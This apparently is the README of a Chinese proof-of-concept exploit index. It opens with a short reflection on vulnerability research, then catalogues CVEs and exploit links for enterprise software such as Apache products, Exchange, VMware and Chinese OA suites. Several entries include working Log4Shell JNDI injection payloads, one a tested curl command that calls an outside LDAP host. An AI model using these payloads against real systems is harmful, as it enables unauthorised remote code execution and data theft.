# 漏洞研究

关于漏洞研究，我想引用`图南&Veraxy@QAX CERT`这篇文章[《一个简单的 RCE 漏洞到底能挖出什么知识》](https://paper.seebug.org/1500/)中的一段话来给出我的理解：

漏洞研究其实不应该只盯着漏洞本身，漏洞可以扩展的知识点太多了：
- **偏应用架构**：了解这个软件/组件/中间件是干什么的的、尝试搭建起来写点测试代码看看跑起来的样子;
- **偏底层原理**：漏洞涉及的相关知识点，可能是Linux/Windows相关的，文件相关的，甚至是某个协议规范、某个算法的实现、某个数据结构、某种设计思想;
- **偏攻击利用**：漏洞如何EXP化、如何回显搞定不出网的环境、如何让内网设备无感知攻击的存在、如何加载内存马等;
- **偏漏洞挖掘**：举一反三，寻找类似的利用点，或者这个新的软件/组件/中间件是否能带给你一些新的漏洞挖掘思路。

其他理解
- [漫谈漏洞挖掘 evilpan](https://evilpan.com/2021/05/22/bug-hunting/)

#### 应用如下
- [Apache APISIX](https://github.com/pen4uin/Poc-Exp#apache-apisix)
- [Apache Druid](https://github.com/pen4uin/Poc-Exp#apache-druid)
- [Apache Flink](https://github.com/pen4uin/Poc-Exp/#apache-flink)
- [Apache HTTP Server](https://github.com/pen4uin/Poc-Exp#apache-http-server)
- [Apache JSPWiki](https://github.com/pen4uin/Poc-Exp#apache-jspwiki)
- [Apache OFBiz](https://github.com/0wlsec/Poc-Exp/#apache--ofbiz)
- [Apache ShenYu](https://github.com/pen4uin/Poc-Exp#apache-shenyu)
- [Apache SkyWalking](https://github.com/pen4uin/Poc-Exp#apache-skyWalking)
- [Apache Solr](https://github.com/pen4uin/Poc-Exp#apache-solr)
- [Apache Storm](https://github.com/pen4uin/Poc-Exp#apache-storm)
- [Apache Struts2](https://github.com/pen4uin/Poc-Exp#apache-struts2)
- [Atlassian Confluence](https://github.com/pen4uin/Poc-Exp/#atlassian-confluence)
- [Atlassian Crowd](https://github.com/pen4uin/Poc-Exp/#atlassian-crowd)
- [Atlassian Jira](https://github.com/pen4uin/Poc-Exp/#atlassian-jira)
- [Citrix](https://github.com/pen4uin/Poc-Exp/#citrix)
- [Cisco](https://github.com/pen4uin/Poc-Exp#cisco)
- [Coremail](https://github.com/pen4uin/Poc-Exp/#coremail)
- [D-Link](https://github.com/pen4uin/Poc-Exp/#d-link)
- [ECShop](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#ecshop)
- [Eyou-亿邮](https://github.com/pen4uin/Poc-Exp/#eyou-%E4%BA%BF%E9%82%AE)
- [Exchange](https://github.com/pen4uin/Poc-Exp/#exchange)
- [F5 BIG-IP](https://github.com/pen4uin/Poc-Exp/#f5-big-ip)
- [FineReport-帆软](https://github.com/pen4uin/Poc-Exp/#finereport-%E5%B8%86%E8%BD%AF)
- [Gitlab](https://github.com/pen4uin/Poc-Exp/#gitlab)
- [Grafana](https://github.com/pen4uin/Poc-Exp/#grafana)
- [Harbor](https://github.com/pen4uin/Poc-Exp/#harbor)
- [H3C](https://github.com/pen4uin/Poc-Exp/#h3c)
- [K-金蝶](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#k-%E9%87%91%E8%9D%B6)
- [Lanproxy](https://github.com/pen4uin/Poc-Exp/#lanproxy)
- [Laravel](https://github.com/pen4uin/Poc-Exp/#laravel)
- [Live800](https://github.com/pen4uin/Poc-Exp/#live800)
- [MeterSphere](https://github.com/pen4uin/Poc-Exp/#metersphere)
- [Jboss](https://github.com/pen4uin/Poc-Exp/#jboss)
- [Jellyfin](https://github.com/pen4uin/Poc-Exp/#jellyfin)
- [Jetty](https://github.com/pen4uin/Poc-Exp/#jetty)
- [J-金山终端安全系统](https://github.com/pen4uin/Poc-Exp#j-%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F)
- [OA-金和](https://github.com/pen4uin/Poc-Exp/#oa-%E9%87%91%E5%92%8C)
- [OA-蓝凌](https://github.com/pen4uin/Poc-Exp/#oa-%E8%93%9D%E5%87%8C)
- [OA-泛微](https://github.com/pen4uin/Poc-Exp/#oa-weaver-%E6%B3%9B%E5%BE%AE)
- [OA-然之协同](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#oa-%E7%84%B6%E4%B9%8B%E5%8D%8F%E5%90%8C)
- [OA-致远](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#oa-%E8%87%B4%E8%BF%9C)
- [OA-通达](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#oa-%E9%80%9A%E8%BE%BE)
- [OA-万户](https://github.com/pen4uin/Poc-Exp#oa-%E4%B8%87%E6%88%B7)
- [OA-信呼](https://github.com/pen4uin/Poc-Exp#oa-%E4%BF%A1%E5%91%BC)
- [Phpstudy](https://github.com/pen4uin/Poc-Exp/#phpstudy)
- [Q-齐治堡垒机](https://github.com/pen4uin/Poc-Exp/#q-%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA)
- [Ruijie-锐捷](https://github.com/pen4uin/Poc-Exp/#ruijie-%E9%94%90%E6%8D%B7)
- [RuoYi-偌依](https://github.com/pen4uin/Poc-Exp#ruoyi-%E5%81%8C%E4%BE%9D)
- [SpiderFlow](https://github.com/pen4uin/Poc-Exp#spiderflow)
- [Spring](https://github.com/pen4uin/Poc-Exp/#spring)
- [Thinkadmin](https://github.com/pen4uin/Poc-Exp/#thinkadmin)
- [ThinkPHP3](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#thinkphp-3x)
- [ThinkPHP5](https://github.com/pen4uin/Poc-Exp/blob/main/README.md#thinkphp-5x)
- [T-360天擎](https://github.com/pen4uin/Poc-Exp/#t-360%E5%A4%A9%E6%93%8E)
- [Typecho](https://github.com/pen4uin/Poc-Exp/#typecho)
- [VMware](https://github.com/pen4uin/Poc-Exp/#vmware)
- [Weblogic](https://github.com/pen4uin/Poc-Exp/#weblogic)
- [Yonyou-用友](https://github.com/pen4uin/Poc-Exp/#yonyou-%E7%94%A8%E5%8F%8B)


## Apache APISIX
- 🎯 CVE-2021-45232 Apache APISIX Dashboard Pre-Auth RCE
  - 📌 [apisix_dashboard_rce](https://github.com/wuppp/apisix_dashboard_rce)
## Apache Druid
- 🎯 [Apache Druid RCE via Log4shell](https://github.com/pen4uin/JavaSec/blob/main/apache%20druid/vulnerability-research.md)
    ```shell
    # tested
    curl -vv -X DELETE "http://10.10.10.139:8081/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2fcpy1p.aliyundun.net%7d"
    # haven't tested
    http://0.0.0.0:8888/druid/coordinator/${jndi:ldap://0.0.0.0/123}
    http://0.0.0.0:8888/druid/indexer/${jndi:ldap://0.0.0.0/123}
    http://0.0.0.0:8888/druid/v2/${jndi:ldap://0.0.0.0/123}
    ```
## Apache Flink
- 🎯 CVE-2020-17518(Apache Flink 目录遍历/文件写入漏洞-Upload) `2021-01`
- 🎯 CVE-2020-17519(Apache Flink 目录遍历/文件读取漏洞-jobmanager/logs)b`2021-01`
- 🎯 CVE-2021-44228(Apache Flink RCE via Log4shell)
## Apache HTTP Server
- 🎯 CVE-2021-41773(Apache HTTP Server Path Traversal and Remote Code Execution)
- 🎯 CVE-2021-42013(Apache HTTP Server Path Traversal and Remote Code Execution)

## Apache JSPWiki
- 🎯 CVE-2021-44140 Apache JSPWiki Arbitrary file deletion on logout
- 🎯 Apache JSPWiki RCE via Log4shell
    ```shell
    http://0.0.0.0:8080/Edit.jsp?page=Main
    X-Forwarded-For:${jndi:dns://0.0.0.0/123}
    ```
## Apache OFBiz
- 🎯 CVE-2020-9496 Apache Ofbiz 远程代码执行漏洞
- 🎯 CVE-2021-26295 Apache OFBiz 远程代码执行漏洞
- 🎯 Apache OFBiz RCE via Log4shell
    ```shell
    # 1、
    GET: https://0.0.0.0:8443/webtools/control/main
    Cookie: OFBiz.Visitor=${jndi:ldap://0.0.0.0/123}
    # 2、
    POST: https://0.0.0.0:8443/webtools/control/setLocaleFromBrowser
    Content-Type: text/html;charset=UTF-8${jndi:ldap://0.0.0.0/123}
    ```

## Apache ShenYu
- 🎯 CVE-2021-37580 Apache ShenYu 身份验证绕过漏洞
## Apache SkyWalking
- 🎯 Apache SkyWalking RCE via Log4shell 
    ```shell
    POST: http://0.0.0.0:8080/graphql
    data: {"query":"${jndi:dns://0.0.0.0/123}","variables":{"duration":{"start":"2021-12-22 1259","end":"2021-12-22 1314","step":"MINUTE"}}}
    ```
    
## Apache Solr
- 🎯 Apache SkyWalking RCE via Log4shell 
    ```shell
    /solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://0.0.0.0/123%7D&wt=json
    /solr/admin/info/system?_=${jndi:ldap://0.0.0.0/123}&wt=json
    /solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=${jndi:ldap://0.0.0.0/123}&name=
    ```
## Apache Storm
- 🎯 CVE-2021-38294 Apache Storm 反序列化漏洞
- 🎯 CVE-2021-40865 Apache Storm 命令注入漏洞
## Apache Struts2
- 🎯 [Apache Struts2 RCE via Log4Shell](https://github.com/pen4uin/JavaSec/blob/main/struts2/vulnerability-research.md)
## Atlassian Confluence
- 🎯 CVE-2019-3396 Atlassian Confluence 路径穿越漏洞
- 🎯 CVE-2021-26084 Atlassian Confluence OGNL 注入漏洞-可回显)
- 🎯 CVE-2021-26085 Atlassian Confluence任意文件读取漏洞（受限）

## Atlassian Crowd
- 🎯 CVE-2019-11580 Atlassian Crowd RCE

## Atlassian Jira
- 🎯 CVE-2021-26086 (Jira 文件读取漏洞)
- 🎯 CVE-2020-29453 (Jira 文件读取漏洞)
- 🎯 CVE-2020-14181 (Jira 用户名枚举漏洞)
- 🎯 CVE-2019-8451 (Jira 未授权SSRF漏洞)
- 🎯 CVE-2019-8442 (Jira 未授权+信息泄露漏洞)
- 🎯 CVE-2019-3402 (Jira 反射型XSS漏洞)
- 🎯 CVE-2019-8444 (Jira  存储型XSS漏洞)
- 🎯 CVE-2017-9506 (Jira URL跳转漏洞)

## Citrix
- 🎯 CVE-2020-8209(Citrix XenMobile 目录遍历/任意文件读取漏洞)
- 🎯 Citrix XenMobile RCE via Log4shell
    ```
    # Source: https://twitter.com/twcsftech/status/1471716640606007299
    curl https://<TARGET>/zdm/cxf/login -H 'Referer: https://<TARGET>/zdm' -d 'login=${jndi:ldap://<PAYLOAD>/wibtio}&password=' -k 
    ```
## Cisco
- 🎯 CVE-2020-3452(Cisco ASAFTD任意文件读取漏洞)

## Coremail
- 🎯 ~~Coremail 邮件系统 action.jsp 任意文件上传漏洞 ~~  `fake`
- 🎯 Coremail 任意用户密码修改漏洞 


## D-Link
- 🎯 CVE-2020-25078(D-Link DCS-2530L 敏感信息泄露漏洞) `2021-04`
- 🎯 CVE-2018-6530(D-Link 远程命令执行漏洞)
- 🎯 CVE-2019-7297(D-Link DIR-823G 命令注入漏洞)
- 🎯 CVE-2019-7298(D-Link DIR-823G 命令注入漏洞)
- 🎯 CVE-2019-13128(D-Link DIR-823G 命令注入漏洞)
- 🎯 CVE-2019-15529(D-Link DIR-823G 命令注入漏洞)
- 🎯 CVE-2019-17621(D-Link DIR-859 远程代码执行漏洞)
- 🎯 CNVD-2018-01084(D-Link DIR-615/645/815 命令注入漏洞)
- 🎯 CVE-2018-17063(D-Link DIR-816 A2 命令注入漏洞)
- 🎯 CVE-2020-24581(D-link DSL-2888A 远程代码执行)


## ECShop
- 🎯 ECShop v2.x/3.x 远程代码执行漏洞
- 🎯 ECShop v3.0 SQL注入漏洞-flow.php 
- 🎯 ECShop v2.6.1 SQL注入漏洞-uc.php
- 🎯 ECShop v4.1.0 SQL注入漏洞-/ecshop/delete_cart_goods.php
- 🎯 ECShop v2.7.3 SQL注入漏洞(CVE-2021-43679)

## Eyou-亿邮
- 🎯 亿邮 远程命令执行漏洞-/webadm/?q=moni_detail.do&action=gragh

## Exchange
- 🎯 CVE-2021-26855(Exchange SSRF漏洞)
- 🎯 ProxyLogon (CVE-2021-26855 + CVE-2021-27065)
- 🎯 ProxyOracle (CVE-2021-31195 + CVE-2021-31196)
- 🎯 ProxyShell (CVE-2021-34473 + CVE-2021-34523  + CVE-2021-31207)
- 🎯 CVE-2021-41349 Exchange XSS


## F5 BIG-IP
- 🎯 CVE-2020-5902(F5 BIG-IP远程代码执行漏洞) `2021-01`
- 🎯 CVE-2021-22986(F5 BIG-IP远程代码执行漏洞) `2021-03`

## FineReport-帆软
- 🎯 帆软报表 2012 信息泄露漏洞 `2021-05`
- 🎯 帆软报表 回显SSRF/任意文件读取漏洞 `2021-05` 
- 🎯 帆软报表 v8 任意文件读取漏洞(CNVD-2018-04757) `2021-05` 
- 🎯 帆软报表 v8 目录遍历漏洞 `2021-08`
- 🎯 帆软报表 v9 任意文件上传(非覆盖-CNVD-2021-34467) `2021-05`

## Gitlab
- 🎯 Gitlab CI Lint API未授权 SSRF漏洞(CVE-2021-22214)

## Grafana
- 🎯 Grafana 未授权任意文件读取漏洞-/public/plugins/grafana-clock-panel/

## Harbor
- 🎯 CVE-2019-16097 任意管理员注册


## H3C
- 🎯 H3C IMC dynamiccontent.properties.xhtm 远程命令执行漏洞 `2021-05`
- 🎯 H3C 下一代防火墙任意文件读取漏洞 `2021-05`
- 🎯 H3C SecPath 运维审计系统 任意用户登录漏洞 `2021-05`


## K-金蝶
- 🎯 金蝶EAS server_file 目录遍历漏洞


## Lanproxy
- 🎯 CVE-2020-3019 (lanproxy 目录遍历/任意文件读取漏洞) `2021-01`

## Laravel
- 🎯 CVE-2021-3129(Laravel Debug RCE) `2021-02`

## Live800
- 🎯 Live800 downloadserver 任意文件下载漏洞 `2021-02`

## MeterSphere
- 🎯 CVE-2021-45789 MeterSphere Post-auth 文件读取
     ```shell
     /api/automation/file/download
     ```
- 🎯 CVE-2021-45790 MeterSphere Pre-auth 文件上传
     ```shell
     /resource/md/upload
     ```
- 🎯 MeterSphere Plugin Pre-auth RCE
     ```
     # 上传jar包注册恶意类
     /plugin/add
     # 调用类中的customMethod函数、rce
     /plugin/customMethod
     ```

## Jboss
- 🎯 CVE-2006-5750
- 🎯 CVE-2007-1036
- 🎯 CVE-2010-0738
- 🎯 CVE-2010-1871(JBoss Seam Framework远程代码执行漏洞)
- 🎯 CVE-2015-7501(JBoss JMXInvokerServlet 反序列化漏洞) `2021-01`
- 🎯 CVE-2013-4810
- 🎯 CVE-2017-7504(JBoss 4.x JBossMQ JMS 反序列化漏洞) `2021-01`
- 🎯 CVE-2017-12149(JBOSS AS 5.x/6.x反序列化命令执行漏洞) `2021-01`
- 🎯 CVE-xxxx-xxxxx(JBoss jmx-consoleHtmlAdaptor addURL() 文件上传漏洞)

## Jellyfin
- 🎯 Jellyfin 任意文件读取漏洞(CVE-2021-21402) `2021-05`

## Jetty
- 🎯 Jetty URI路径限制绕过漏洞（CVE-2021-28169）
- 🎯 Jetty URI路径限制绕过漏洞（CVE-2021-28164）

## J-金山终端安全系统
- 🎯 金山终端安全管理系统 v8 任意文件上传漏洞-upload.php 
- 🎯 金山终端安全管理系统 v8 任意文件读取漏洞-downfile.php 
- 🎯 金山终端安全管理系统 v8 命令执行漏洞-pdf_maker.php

## OA-金和
- 🎯 金和OA C6 管理员默认口令 `2021-05` 
- 🎯 金和OA C6 download.asp 任意文件下载漏洞 `2021-07`


## OA-蓝凌
- 🎯 CNVD-2021-01363(蓝凌OA EKP 后台SQL注入漏洞) `2021-04`
- 🎯 蓝凌OA custom.jsp SSRF/任意文件读取漏洞 `2021-05`
- 🎯 蓝凌OA 远程命令执行漏洞(SSRF+XMLDecoder=RCE) `2021-05`
- 🎯 蓝凌OA 远程命令执行漏洞(SSRF+JNDI=RCE) `2021-05`
- 🎯 CNVD-2020-62240(蓝凌OA SQL注入漏洞-/admin/list/list.aspx) `2021-07`

## OA-Weaver-泛微
- 📌 [weaver_exp](https://github.com/z1un/weaver_exp)
- 🎯 wooyun-2016-0191882(泛微OA SQL注入漏洞-HrmResourceContactEdit.jsp)
- 🎯 wooyun-2016-0178866(泛微OA 某接口任意SQL命令执行漏洞)
- 🎯 wooyun-2016-0169872(泛微OA 任意文件遍历&操作漏洞)
- 🎯 wooyun-2016-0198158(泛微OA SQL注入漏洞)
- 🎯 wooyun-2016-0198158(泛微OA 任意文件读取漏洞)
- 🎯 wooyun-2016-0169453(泛微OA SOAP注入漏洞)
- 🎯 wooyun-2016-0215533(泛微OA 数据库任意操作漏洞-xp_cmdshell)
- 🎯 CNVD-2017-03561(泛微e-mobile login.do表达式注入漏洞)
- 🎯 CNVD-2019-29900(泛微OA 任意文件下载漏洞)
- 🎯 CNVD-2019-29902(泛微OA 任意文件读取漏洞)
- 🎯 CNVD-2019-32204(泛微OA 远程命令执行漏洞)
- 🎯 CNVD-2019-34241(泛微OA 前台SQL注入漏洞-WorkflowCenterTreeData.jsp)
- 🎯 CNVD-2019-40989(泛微OA SQL注入漏洞-SyncUserInfo.jsp)
- 🎯 CNVD-2019-40989(泛微OA SQL注入漏洞-WorkflowCenterTreeData.jsp)
- 🎯 CNVD-2019-41610(泛微OA SQL注入漏洞-validate.jsp)
- 🎯 CNVD-2020-59520(泛微e-bridge 目录遍历/任意文件读取漏洞)
- 🎯 CNVD-xxxx-xxxxx(泛微OA 数据库配置信息泄露漏洞-DBconfigReader.jsp)
- 🎯 CNVD-xxxx-xxxxx(泛微OA 日志信息泄露漏洞-gethrmkq.jsp) 
- 🎯 泛微 OA SSRF漏洞 
- 🎯 泛微 Eoffice 数据库配置信息泄露漏洞-mysql_config.ini 
- 🎯 泛微 OA 前台SQL注入漏洞-/js/hrm/getdata.jsp  
- 🎯 泛微 e-mobile6.6 前台RCE 
- 🎯 泛微 OA 任意文件上传漏洞-sysinterface/codeEdit.jsp 
- 🎯 泛微 OA V9 uploadOperation.jsp 文件上传漏洞 
- 🎯 泛微 OA WorkflowServiceXml 绕过访问限制漏洞(RCE) 
- 🎯 泛微 OA 任意文件上传漏洞-cloudstore 
- 🎯 泛微 OA v8 任意文件下载漏洞 
- 🎯 泛微 OA 任意文件上传漏洞-KtreeUploadAction 
- 🎯 泛微 OA 任意文件上传漏洞-ExcelUploadServlet 
- 🎯 泛微 Eoffice v10 SQL注入漏洞-leave_record.php
- 🎯 CNVD-2021-49104 泛微 Eoffice v9 文件上传漏洞-UploadFile.php

## OA-然之协同
- 🎯 然之协同系统 v4.6.1 SQL注入
- 🎯 然之协同系统 v4.6.1 SQL注入->文件删除
- 🎯 然之协同系统 v4.6.1 SQL注入->文件下载
- 🎯 然之协同系统 v4.6.1 SQL注入-文件删除->RCE
- 🎯 然之协同系统 v4.6.1 喧喧聊天系统 RCE

## OA-致远
- 📌 [seeyou_exp](https://github.com/z1un/seeyou_exp)
- 🎯 致远OA Session泄露漏洞-/yyoa/ext/https/getSessionList.jsp
- 🎯 致远OA 帆软报表组件 前台XXE漏洞
- 🎯 致远OA 帆软报表v8.0 后台文件上传漏洞
- 🎯 致远OA A6 信息泄露漏洞-createMysql
- 🎯 致远OA A6 信息泄露漏洞-DownExcelBeanServlet
- 🎯 致远OA A6 信息泄露漏洞-initDataAssess
- 🎯 致远OA A6 setextno.jsp SQL注入漏洞
- 🎯 致远OA A6 test.jsp SQL注入漏洞
- 🎯 致远OA A6 search_result.jsp SQL注入漏洞
- 🎯 致远OA A6 webmail.do 任意文件下载漏洞
- 🎯 致远OA A8 任意用户密码修改漏洞
- 🎯 致远OA A8 用户名&密码枚举漏洞-/seeyon/getAjaxDataServlet
- 🎯 致远OA A8 任意文件读取漏洞-/seeyon/management/status.jsp
- 🎯 致远OA A8 远程代码执行漏洞-htmlofficeservlet
- 🎯 致远OA ajax.do 未授权访问+任意文件上传漏洞
- 🎯 致远OA Cookie泄露+任意文件上传漏洞
- 🎯 致远OA Fastjson 反序列化漏洞


## OA-通达
- 📌 [TongdaOA-exp](https://github.com/z1un/TongdaOA-exp)
- 🎯 通达OA v11.9 前台SQL注入-get_datas.php

## OA-万户
- 🎯 万户OA文件上传漏洞-/defaultroot/upload/fileUpload.controller
- 🎯 万户OA文件上传漏洞-/defaultroot/officeserverservlet

## OA-信呼
- 🎯 信呼OA v2.1.7 后台SQL注入漏洞-typeid
- 🎯 信呼OA v2.2.8 后台文件操作->RCE
- 🎯 信呼OA v2.2.8 后台SQL注入->RCE
- 🎯 信呼OA v2.3.0 后台配置文件->RCE

## Phpstudy
- 🎯 phpstudy backdoor

## Q-齐治堡垒机
- 🎯 齐治堡垒机任意用户登录漏洞 `2021-05`


## Ruijie-锐捷
- 🎯 RG-EG系列(锐捷-EWEB网管系统命令注入-/guest_auth/guestIsUp.php) `2021-01`
- 🎯 CNVD-2021-14536(RG-UAC统一上网行为管理审计系统信息泄露漏洞)
- 🎯 锐捷EG易网关 branch_passw.php 远程命令执行漏洞
- 🎯 锐捷EG易网关 cli.php 远程命令执行漏洞
- 🎯 锐捷EG易网关 download.php 后台任意文件读取漏洞

## RuoYi-偌依
- 🎯 RuoYi 后台模板注入漏洞
- 🎯 RuoYi <= v4.6.2 (后台)反序列化漏洞-snakeyaml
- 🎯 RuoYi <= v4.6.1 (后台)SQL注入漏洞-/system/role/list
- 🎯 RuoYi <= v4.5.0 (后台)任意文件下载漏洞-/common/download/resource
- 🎯 RuoYi <= v4.4.0 Shiro权限认证绕过漏洞
- 🎯 RuoYi <= v4.3.0 Shiro反序列化漏洞
- 🎯 RuoYi <= v4.3.0 Shiro权限认证绕过漏洞
- 🎯 RuoYi <= v3.2.0 SQL注入漏洞
## SpiderFlow
> https://www.spiderflow.org/
> 
> https://github.com/ssssssss-team/spider-flow
- 🎯 SpiderFlow RCE via Nashorn
## Spring
- 🎯 CVE-xxxx-xxxx SpringBoot Actuator未授权访问漏洞
- 🎯 CVE-2018-1271 Spring MVC目录穿越/遍历漏洞
- 🎯 CVE-2019-3799 Spring Cloud Config Server 路径穿越/任意文件读取漏洞
- 🎯 CVE-2020-5405 Spring Cloud Config Server路径遍历漏洞
- 🎯 CVE-2020-5410 Spring Cloud Config目录穿越/遍历漏洞
- 🎯 CVE-2020-5412 Spring Cloud Netflix Hystrix Dashboard SSRF漏洞-proxy.stream
- 🎯 CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal

## Thinkadmin
- 🎯 CVE-2020-25540(目录遍历/任意文件读取漏洞)
- 🎯 CNVD-2020-33163

## ThinkPHP 3.x
- 🎯 ThinkPHP3.2.x RCE(文件包含->RCE)

## ThinkPHP 5.x

## T-360天擎
- 🎯 360天擎 SQL注入漏洞 `2021-05`
- 🎯 360天擎 数据库信息泄露漏洞 `2021-05`

## Typecho
- 🎯 Typecho v1.0 SSRF漏洞- xmlrpc `2021-01-11`
- 🎯 CVE-2018-18753(Typecho v1.1 反序列化漏洞-install.php)

## VMware
- 🎯 VMware vCenter 远程命令执行漏洞(CVE-2021-21972)
- 🎯 VMware vRealize Operations Manager SSRF(CVE-2021-21975) 
- 🎯 VMware vCenter 远程代码执行漏洞(CVE-2021-21985-回显） 
- 🎯 VMware vCenter 任意文件读取漏洞-/eam/vib?id=
- 🎯 VMware vCenter Server 文件上传漏洞（CVE-2021-22005）
- 🎯 VMware vCenter SSRF/任意文件读取漏洞-/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=
- 🎯 VMware View Planner 远程代码执行漏洞（CVE-2021-21978）
- 🎯 Vmware Product RCE via Log4Shell
  - 📌 [Vm4J](https://github.com/NS-Sp4ce/Vm4J)

## Weblogic
- 🎯 CVE-2020-14882/CVE-2020-14883(WebLogic 未授权命令执行漏洞)
- 🎯 CVE-2020-14750 权限绕过

## [Yonyou-用友](https://github.com/0wlsec/Poc-Exp/blob/main/demo/Yonyou.md)
- 🎯 用友人力资源管理软件（e-HR）XXE漏洞
- 🎯 用友 FE协作办公平台1.0信息泄露漏洞
- 🎯 用友 NC 5.7 跨站脚本漏洞
- 🎯 用友 ERP-NC hrss/ELTextFile.load.d 任意文件读取漏洞
- 🎯 用友 NC本地文件包含漏洞-NCFindWeb
- 🎯 用友 NC财务系统跨站脚本漏洞
- 🎯 用友 TurboCRM /ajax/getemaildata.php 任意文件读取漏洞
- 🎯 用友 UA-PWS XXE漏洞
- 🎯 用友 FE协作办公系统 addUser.jsp SQL注入漏洞 `2021-02`
- 🎯 用友 FE协作办公系统 codeMoreWidget.jsp SQL注入漏洞 `2021-02`
- 🎯 用友 ICC客服系统 getfile.jsp 任意文件下载漏洞 `2021-02`
- 🎯 用友 ICC客服系统跨站脚本漏洞 `2021-02`
- 🎯 用友 NC-IUFO系统跨站脚本漏洞 `2021-02`
- 🎯 用友 TruboCRM管理系统 /background/ 三处SQL注入漏洞 `2021-02`
- 🎯 用友 TruboCRM管理系统 /login/forgetpswd.php SQL注入漏洞 `2021-02`
- 🎯 CNVD-2020-49261(用友GRP-U8 SQL注入漏洞)
- 🎯 用友 NC bsh.servlet.BshServlet 远程命令执行漏洞 
  - 📌 [NC-BeanShell-RCE](https://github.com/z1un/NC-BeanShell-RCE)
- 🎯 用友GRP-U8 SQL注入漏洞 `2021-05`
- 🎯 用友 NCCloud FS文件管理SQL注入漏洞 `2021-05`
- 🎯 用友 U8 OA test.jsp SQL注入漏洞 `2021-05`
- 🎯 用友 NC6.5 任意文件上传漏洞-FileReceiveServlet 
- 🎯 用友 NC 反序列化漏洞




##### Reference
- https://mp.weixin.qq.com/s/VGMxrw8HD2ZbQHpyL-V_nQ

